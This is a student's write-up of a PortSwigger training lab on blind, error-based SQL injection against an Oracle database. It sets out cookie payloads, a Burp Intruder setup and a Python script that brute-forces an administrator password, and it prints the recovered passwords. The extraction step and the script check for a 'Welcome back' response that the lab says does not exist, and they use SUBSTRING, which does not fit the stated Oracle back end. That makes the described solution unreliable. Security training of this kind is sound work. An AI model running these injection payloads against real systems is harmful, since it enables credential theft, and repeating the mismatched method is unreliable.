# Blind SQL injection with conditional errors

**Category:** Web Exploitation — SQL Injection  
**Difficulty:** Practitioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors`

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

Hint:
This lab uses an Oracle database. 


---

## Reconnaissance

- What does the application do? 
    - Still the same basic shop website
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - there is no input field (account login is back) but the user can input text into the url
- What happens with normal input?
    - inputting a normal word instead of the given categories prints the word on the page and shows no results, inputting the given categories works like it should

---

## Analysis

#### Technology Stack
```
Database:   Oracle (as per the hint)
Input:      URL
Behavior:   Blind error-based SQL Injection
```

#### Vulnerability

- What exactly is vulnerable and why?
    
As per the lab instructions the cookie containing a `TrackingId` is vulnerable.
The sql in the background probably looks like this:
```sql
select TrackingId FROM TrackedUsers WHERE TrackingID = [Input]
```
This works like it should if there is just a TrackingId in the cookie, but if an Attacker puts sql in there this is unsafe.
This time the applocation has no 'Welcome back' message acting as a flag but instead returns an error message when the sql query causes an error.

---

## Solution

### Step 0 - Recreating the lesson

Inputting the same command as shown in the lesson (but slightly changed because of oracle syntax):
```sql
TrackingId=vOOG5hYxAdYPizP1'AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) = 'a'-- -
```
indeed throws a `HTTP/2 500 Internal Server Error` and when `1=2` it returns `HTTP/2 200 OK` so this is our boolean.

---
### Step 1 - Fingerprinting the database

Not subject of this lab, but can be done by trying different synax and see which reply crashes/stays alive. This is an oracle database as per the hint.

---

### Step 2 - Enumeration

Step 1 is to get the length of the password again.
First take a look at the query given in the example:

```sql
TrackingId=vOOG5hYxAdYPizP1' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
First lets just use LENGTH:

```sql
TrackingId=vOOG5hYxAdYPizP1' AND (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20)
```
Double Parenthesis after `LENGTH` because `SELECT ...` is a subquery used as a value and thus needss to be inside brackets.
This will always give back a `http 200` since it does not trigger an error internally.
Wrapping this into the example query from the lab:

```sql
TrackingId=vOOG5hYxAdYPizP1' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = 20) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL)='a'-- -
```

Note the `FROM DUAL` since ORACLE always needs `FROM` in every `SELECT`-Statement. This should produce a Response Error the moment the length of the admin password is equal to our comparing number. In this case the admin password is 20 chars long when this error is sent.




### Step 3 - Extract / Exploit
Now using the Intruder we need to set it up correctly.
This is how the Intruder takes our payload. § is like a bracket around whatever value we want to change. In this case the first number in the substring method needs to go up since we got 20 characters in the password. And the value we comapre against needs to be a-z0-9 so we have to set that payload up seperately. The cluster bomb attack is used since the payload has multiple variable positions. Otherwise the Sniper attack would have worked. 
```sql
xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),§1§ , 1) = '§a§'-- -
```
Important here that `administrator` is lowercase, otherwise intruder will not find any 'Welcome Back's.
The password in the end is: xpgpxa1hdehptkz0ehs1
The problem is, the Intruder ran for so long that I went away and when it finished and I did not comeback the lab closed due to inactivity. 
So the new solution is to build a python script to get the password a bit quicker.


```python

import requests, string              # requests to send requests, get responses etc.
url ="https://0a8d006003ab6d3e804d674800040027.web-security-academy.net/filter"
chars = string.ascii_lowercase + string.digits        #a-z0-9
password = ""

for pos in range(1, 21):
    for c in chars:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{c}'-- -"  # same idea as burp intruder
        r = requests.get(url,
                        params={"category": "Gifts"},
                        cookies={"TrackingId": "kJBYV1qQLcQyHJdd" + payload,
                                  "session": "YOUR-SESSION"})
        if "Welcome back" in r.text:
            password += c
            break
print("Password:", password)
```

The password this time around is: syppqagonu64cnclq125


---

## Real World Impact

Even if the application does not return a lot of info to an attacker it can still be a major security flaw. This attack perfectly demonstrates that - only minor information leaks leading to the same exploitation earlier sqlinjections had.

---

## Learnings

- Burp Intruder is good - but scripting it in python is even faster (burp community is not quick enough)
- Binary search instead of iteration is needed for bigger, more complex tasks
- blind injection does not really mean blind. Even a yes/no response is enough information to exploit a target.
